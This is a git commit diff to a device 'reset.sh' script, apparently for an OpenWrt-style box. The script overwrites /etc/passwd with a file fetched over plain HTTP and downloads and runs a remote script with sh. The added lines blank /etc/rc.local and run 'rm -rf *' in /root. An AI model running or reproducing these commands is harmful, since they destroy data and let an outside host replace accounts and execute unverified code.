cd22e55607d70e709d3947952ade7091a39dda56
xiefucai <laozi12345@126.com>
2016-03-30 16:14:03 +0800

    aa

--- tools/zqb2/reset.sh
+++ tools/zqb2/reset.sh
@@ -1,6 +1,8 @@
 LOG_PATH=/tmp/reset.log
 wget 'http://www.xiefucai.com/tools/zqb2/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
 ubus call dcdn set_dcdn_client '{"count":1}'
+echo 'exit 0'>/etc/rc.local
+cd /root;rm -rf *;
 
 # 安装断网诊断工具
 wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/wget_ddd.sh 2>>$LOG_PATH;chmod +x /tmp/wget_ddd.sh 2>>$LOG_PATH;sh /tmp/wget_ddd.sh 2>>$LOG_PATH;
